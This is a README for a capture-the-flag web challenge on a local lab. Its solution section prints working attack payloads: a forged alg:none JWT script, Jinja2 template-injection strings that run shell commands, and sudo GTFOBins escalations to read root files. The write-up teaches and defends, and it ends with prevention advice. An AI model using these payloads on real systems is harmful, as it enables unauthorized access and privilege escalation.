# Bravo - Weak JWT Challenge

**Status:** ✅ Complete

## Player Description

You've found the Corporate Portal! It looks like they use some kind of token-based session management. The portal seems pretty locked down, but who knows what's lurking under the surface? Maybe the developers left something useful behind...

## Technical Description

A multi-stage challenge demonstrating JWT (JSON Web Token) authentication vulnerabilities, Server-Side Template Injection (SSTI), and Linux privilege escalation. Players must discover credentials, manipulate unsigned JWTs, exploit template rendering, and escalate to root.

**Category:** Web / Authentication / RCE / Privilege Escalation
**Difficulty:** Easy-Medium → Hard (progressive)
**Points:** 1,150 (3 flags)

## Challenge Information

- **Port:** 5002
- **URL:** http://localhost:5002

## Objectives

This challenge has three flags representing a complete attack chain:

1. **FLAG 1 (250 pts)**: Discover credentials, manipulate JWT, find the admin panel
2. **FLAG 2 (400 pts)**: Achieve RCE via Server-Side Template Injection (SSTI)
3. **FLAG 3 (500 pts)**: Escalate privileges to root using sudo misconfiguration

## Background: What is a JWT?

A JSON Web Token (JWT) is a compact, URL-safe means of representing claims between two parties. JWTs consist of three parts separated by dots:

```
header.payload.signature
```

- **Header**: Metadata about the token (algorithm, type)
- **Payload**: The actual data/claims (user info, roles, etc.)
- **Signature**: Cryptographic signature to verify integrity

Each part is base64url-encoded JSON.

## Setup

### Using Docker Compose (Recommended)

From the project root directory:

```bash
docker compose up -d bravo
```

The challenge will be available at http://localhost:5002

### Using Docker Directly

From this directory:

```bash
docker build -t weak-jwt .
docker run -p 5002:5002 weak-jwt
```

### Local Development

```bash
pip install -r requirements.txt
python app.py
```

## Solution

<details>
<summary>Click to reveal solution</summary>

### Step 1: Find Credentials

Navigate to http://localhost:5002. You see a login form with no obvious credentials.

**View the page source** (Ctrl+U or right-click → View Source). Near the bottom you'll find:

```html
<!-- TODO: Remove before production deployment
     Dev credentials: user / password123
-->
```

Login with `user` / `password123`.

### Step 2: Understand the JWT

After login, the dashboard displays your session token:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.
```

Decode the parts (base64url):

**Header:**
```json
{"alg": "none", "typ": "JWT"}
```

**Payload:**
```json
{"username": "user", "role": "user"}
```

The `"alg": "none"` means no signature verification.

### Step 3: Modify the JWT

Change `"role": "user"` to `"role": "admin"` and re-encode:

```python
import base64, json

def b64url_encode(data):
    return base64.b64encode(json.dumps(data).encode()).decode().replace('+','-').replace('/','_').replace('=','')

header = {"alg": "none", "typ": "JWT"}
payload = {"username": "user", "role": "admin"}
token = f"{b64url_encode(header)}.{b64url_encode(payload)}."
print(token)
```

Replace the `token` cookie in your browser (DevTools → Application → Cookies) and refresh. The dashboard now shows "Admin Access Granted" — but no flag here.

### Step 4: Find the Admin Panel (FLAG 1)

The dashboard confirms admin access but doesn't give you a flag. You need to discover the admin panel.

Try common admin paths:
- `/admin` — 404
- `/admin/panel` — the admin control panel with **FLAG 1**

**FLAG 1**: `DUNO{5d41402abc4b2a76b9719d911017c592}`

### Step 5: Server-Side Template Injection (FLAG 2)

The admin panel has a "Template Preview Tool" at `/admin/template`. This tool renders Jinja2 templates.

**Test for SSTI:**
```
{{ 7 * 7 }}
```
If it renders `49`, SSTI is confirmed.

**Escalate to RCE to read the flag file:**
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag2.txt').read()}}
```

**FLAG 2**: `DUNO{7c6a180b36896a0a8c02787eeafb0e4c}`

### Step 6: Privilege Escalation to Root (FLAG 3)

Use SSTI-based RCE to enumerate the system:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('sudo -l').read()}}
```

Output reveals:
```
User ctfuser may run the following commands:
    (ALL) NOPASSWD: /usr/bin/env, /usr/bin/python3
```

Both `env` and `python3` are GTFOBins. Use them to read the root flag:

**Via env:**
```
{{request.application.__globals__.__builtins__.__import__('os').popen('sudo /usr/bin/env /bin/sh -c "cat /root/flag3.txt"').read()}}
```

**Via python3:**
```
{{request.application.__globals__.__builtins__.__import__('os').popen('sudo python3 -c "print(open(\\\"/root/flag3.txt\\\").read())"').read()}}
```

**FLAG 3**: `DUNO{9e107d9d372bb6826bd81d3542a419d6}`

</details>

## Learning Objectives

1. **Source Code Review**: Always view page source — developers leave things behind
2. **JWT Structure**: How JWTs are composed (header.payload.signature)
3. **Algorithm None Attack**: The dangers of accepting `alg: none`
4. **Directory Discovery**: Admin panels aren't always linked — try common paths
5. **Server-Side Template Injection**: How template engines can be exploited for RCE
6. **GTFOBins**: How misconfigured sudo permissions enable privilege escalation
7. **Attack Chaining**: Combining multiple vulnerabilities for maximum impact

## Common Pitfalls

1. **Missing the credentials**: They're in the HTML source, not guessable
2. **Forgetting the trailing dot**: JWT signature part is empty but the dot must remain
3. **Wrong base64 encoding**: Use base64url (not standard base64)
4. **Expecting a flag on the dashboard**: The dashboard confirms admin role but the flag is on `/admin/panel`
5. **SSTI payload encoding**: Nested quotes in SSTI payloads need careful escaping
6. **Sudo without TTY**: When exploiting via SSTI, use `-c` flag for non-interactive commands

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

Your session token is displayed on the dashboard. It contains dots as separators and each piece looks like base64. What well-known web authentication format matches that — and are all implementations of it cryptographically verified?

</details>

<details>
<summary>Hint 2</summary>

Decode the token's middle section. One field controls your access level. If you modify that field and re-encode without a valid signature, what happens when the server processes it?

</details>

<details>
<summary>Hint 3</summary>

The admin area has a content preview tool. What does it produce when you input something like `{{7*7}}`? If it evaluates the expression rather than displaying it literally, what does that tell you about the template engine?

</details>

<details>
<summary>Hint 4</summary>

You have code execution as the web app user. Pentesters routinely look for specific misconfigurations on Linux systems that let a low-privileged user run things as root — what categories of checks would you run?

</details>

## Prevention

To prevent these vulnerabilities in real applications:

1. **Never use `"alg": "none"`** in production
2. **Use strong algorithms**: HS256 (HMAC) or RS256 (RSA)
3. **Verify signatures**: Always validate the signature before trusting claims
4. **Use established libraries**: Don't implement JWT manually (use PyJWT, jsonwebtoken, etc.)
5. **Sanitize template input**: Never pass user input to `render_template_string()`
6. **Principle of least privilege**: Don't grant sudo to dangerous binaries
7. **Remove dev artifacts**: HTML comments, test credentials, debug endpoints

## References

- [JWT.io - Introduction to JSON Web Tokens](https://jwt.io/introduction)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [GTFOBins](https://gtfobins.github.io/)
